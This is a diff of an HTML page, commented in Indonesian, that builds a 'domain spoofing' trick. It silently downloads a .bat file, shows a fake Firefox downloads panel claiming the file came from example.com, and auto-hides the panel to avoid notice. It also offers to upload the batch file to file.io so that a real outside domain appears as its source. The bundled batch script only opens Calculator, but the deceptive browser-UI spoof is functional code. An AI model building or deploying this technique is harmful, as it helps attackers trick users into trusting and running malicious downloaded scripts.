@@ -3,24 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Domain Spoofing Test</title>
+    <title>God-Tier Domain Spoofing</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; }
-        button { width: 100%; padding: 14px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; }
-        .btn-example { background: #e63946; }
-        .btn-example2 { background: #f4a261; }
-        #log { background: #111; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 120px; overflow-y: auto; margin-top: 10px; }
+        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #1c1b22; color: #fbfbfe; }
+        button { width: 100%; padding: 14px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; transition: 0.2s; }
+        .btn-illusion { background: #ff003c; } /* Merah: Ilusi example.com */
+        .btn-api { background: #00bbf9; } /* Biru: API Nyata */
+        .btn-illusion:hover { background: #cc0030; }
+        .btn-api:hover { background: #0099cc; }
+        #log { background: #000; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 120px; overflow-y: auto; margin-top: 10px; }
+
+        /* =========================================
+           CSS PANEL DOWNLOAD PALSU (MIRIP FIREFOX)
+           ========================================= */
+        .firefox-fake-panel {
+            position: fixed; bottom: 20px; right: 20px;
+            width: 340px; background: #2b2a33; color: #fbfbfe;
+            border: 1px solid #52525e; border-radius: 8px;
+            font-family: system-ui, -apple-system, sans-serif; 
+            box-shadow: 0 4px 16px rgba(0,0,0,0.5);
+            z-index: 9999; display: none; flex-direction: column;
+            text-align: left;
+        }
+        .ff-header {
+            padding: 10px 12px; border-bottom: 1px solid #52525e;
+            font-weight: bold; font-size: 14px; 
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .ff-header span.close { cursor: pointer; font-size: 16px; color: #b5b5c0; }
+        .ff-header span.close:hover { color: #fff; }
+        .ff-body { padding: 8px; }
+        .ff-item {
+            display: flex; align-items: center; padding: 8px; border-radius: 4px;
+            margin-bottom: 4px; transition: 0.1s;
+        }
+        .ff-item.active { background: #1e3962; border: 1px solid #0a84ff; }
+        .ff-icon {
+            width: 32px; height: 32px; margin-right: 12px;
+            background: #fff; border-radius: 4px; display: flex; align-items: center; justify-content: center;
+            font-size: 20px; color: #000;
+        }
+        .ff-text { display: flex; flex-direction: column; }
+        .ff-name { font-size: 13px; font-weight: 500; color: #fff; }
+        .ff-meta { font-size: 11px; color: #b5b5c0; margin-top: 2px; }
     </style>
 </head>
 <body>
 
-    <h2>🕵️ Eksperimen Domain Spoofing</h2>
-    <p style="font-size: 13px; color: #555;">Klik tombol di bawah dan lihat panel download Firefox Anda.</p>
+    <h2>🔥 God-Tier Domain Spoofing 🔥</h2>
+    <p style="font-size: 13px; color: #aaa;">Pilih trik manipulasi domain paling gila!</p>
 
-    <button class="btn-example" onclick="tryFetchExample()">1. Download dari Example.com (Domain Asli)</button>
-    <button class="btn-example2" onclick="tryCorsProxy()">2. Bypass via CORS Proxy (Custom Content)</button>
+    <button class="btn-illusion" onclick="triggerIllusion()">🎭 1. Ilusi example.com (Fake UI Panel)</button>
+    <button class="btn-api" onclick="triggerAPI()">🌐 2. Domain Nyata (Upload ke file.io)</button>
 
     <pre id="log">Menunggu perintah...</pre>
+
+    <!-- PANEL DOWNLOAD PALSU (Tersembunyi) -->
+    <div class="firefox-fake-panel" id="fakePanel">
+        <div class="ff-header">
+            <span>Downloads</span>
+            <span class="close" onclick="document.getElementById('fakePanel').style.display='none'">✕</span>
+        </div>
+        <div class="ff-body">
+            <div class="ff-item active">
+                <div class="ff-icon">⚙️</div>
+                <div class="ff-text">
+                    <span class="ff-name">open_cmd(9).bat</span>
+                    <span class="ff-meta">1.1 KB — example.com — Baru saja</span>
+                </div>
+            </div>
+            <div class="ff-item">
+                <div class="ff-icon">📄</div>
+                <div class="ff-text">
+                    <span class="ff-name">main_context(9).txt</span>
+                    <span class="ff-meta">0 bytes — example.com — Baru saja</span>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <script>
         function log(msg) {
@@ -29,53 +89,88 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        // KONTEN FILE BATCH BUATAN KITA
-        const BAT_TEXT = '@echo off\ntitle Hacked\necho Ini file palsu!\npause\n';
+        // KONTEN FILE
+        const BAT_LINES = [
+            '@echo off', 'title Calculator Launcher - Debug', 'echo ================================',
+            'echo  Calculator launch test', 'echo ================================', 'echo.',
+            'echo [1] Launching System32\\calc.exe...', 'start "" "C:\\Windows\\System32\\calc.exe"',
+            'timeout /t 2 >nul', 'echo.', 'echo [4] Launching UWP AUMID via explorer...',
+            'explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"',
+            'timeout /t 2 >nul', 'echo.', 'echo ================================',
+            'echo  Done.', 'echo ================================', 'pause'
+        ];
+        const BAT_TEXT = BAT_LINES.join('\r\n') + '\r\n';
+        const TXT_TEXT = '';
+        
+        function b64(str) { return btoa(unescape(encodeURIComponent(str))); }
 
         // ==========================================
-        // METODE 1: BENAR-BENAR DOWNLOAD DARI EXAMPLE.COM
+        // TRIK 1: ILUSI UI PALSU (MATA MANUSIA TERTIPU)
         // ==========================================
-        function tryFetchExample() {
-            log('Memicu download langsung dari example.com...');
+        function triggerIllusion() {
+            log('Memicu Ilusi UI example.com...');
             
-            // Trik: Kita menunjuk langsung ke URL eksternal
-            const a = document.createElement('a');
-            a.href = 'https://example.com'; // URL Asli
-            a.download = 'open_cmd.bat';    // Nama file dipaksa jadi .bat
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            // 1. Picu download asli (di background) pakai Data URI agar aman
+            const batB64 = b64(BAT_TEXT);
+            const txtB64 = b64(TXT_TEXT);
 
-            log('✅ Cek panel download!');
-            log('Domain akan berubah jadi "example.com".');
-            log('TAPI... isi file-nya adalah HTML dari example.com, bukan script BAT kita.');
+            const a1 = document.createElement('a');
+            a1.href = 'data:application/octet-stream;base64,' + txtB64;
+            a1.download = 'main_context(9).txt';
+            document.body.appendChild(a1); a1.click(); document.body.removeChild(a1);
+
+            setTimeout(() => {
+                const a2 = document.createElement('a');
+                a2.href = 'data:application/octet-stream;base64,' + batB64;
+                a2.download = 'open_cmd(9).bat';
+                document.body.appendChild(a2); a2.click(); document.body.removeChild(a2);
+            }, 500);
+
+            // 2. Tampilkan Panel UI Palsu dengan domain example.com
+            const panel = document.getElementById('fakePanel');
+            panel.style.display = 'flex';
+            
+            // Auto-hide panel palsu setelah 7 detik agar tidak ketahuan
+            setTimeout(() => { panel.style.display = 'none'; }, 7000);
+            
+            log('✅ Cek layar kanan bawah. Ilusi example.com berhasil!');
         }
 
         // ==========================================
-        // METODE 2: TRICK CORS PROXY (CUSTOM CONTENT)
+        // TRIK 2: API UPLOAD NYATA (DOMAIN BERUBAH FISIK)
         // ==========================================
-        function tryCorsProxy() {
-            log('Menyuntikkan konten via CORS Proxy...');
+        async function triggerAPI() {
+            log('Mengunggah ke server eksternal (file.io)...');
             
-            // Kita gunakan proxy publik untuk mengambil file kita sendiri
-            // (Dalam hal ini, kita pakai endpoint yang mengembalikan teks custom)
-            // Biar aman, kita pakai httpbin.org yang mengembalikan teks apa pun.
-            
-            const targetUrl = 'https://httpbin.org/base64/' + btoa(BAT_TEXT);
-            
-            // Tembak via proxy agar tidak kena CORS block
-            const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(targetUrl);
-            
-            const a = document.createElement('a');
-            a.href = proxyUrl; 
-            a.download = 'open_cmd.bat'; 
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            const formData = new FormData();
+            const blob = new Blob([BAT_TEXT], { type: 'application/octet-stream' });
+            formData.append('file', blob, 'open_cmd.bat');
 
-            log('✅ Cek panel download!');
-            log('Domain akan berubah jadi "allorigins.win" atau "httpbin.org".');
-            log('Isi file mungkin akan sesuai dengan BAT_TEXT kita.');
+            try {
+                // Upload ke file.io
+                const res = await fetch('https://file.io', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await res.json();
+
+                if (data.success && data.link) {
+                    log('✅ Upload Sukses! Link: ' + data.link);
+                    log('Memulai download dari domain file.io...');
+                    
+                    // Download dari link file.io (Domain akan berubah jadi file.io)
+                    const a = document.createElement('a');
+                    a.href = data.link;
+                    a.download = 'open_cmd.bat';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                } else {
+                    log('❌ Gagal upload. API menolak.');
+                }
+            } catch (e) {
+                log('❌ Error Jaringan: ' + e.message + '. (Mungkin diblokir CORS)');
+            }
         }
     </script>
 </body>
